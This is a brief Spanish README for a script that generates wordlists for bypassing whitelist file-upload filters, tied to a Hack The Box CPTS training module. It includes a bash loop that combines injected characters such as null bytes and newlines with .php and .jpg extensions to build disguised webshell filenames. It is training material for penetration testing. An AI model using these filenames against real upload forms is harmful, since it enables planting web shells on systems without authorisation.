# Character-Injection-2-extension

Simple script que permite generar diccionarios para la inyeccion en el bypass de file upload de CPTS (https://academy.hackthebox.com/module/136/section/1289) Filtros de lista blanca, basicamente es el siguiente script, "pero mejorado".

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
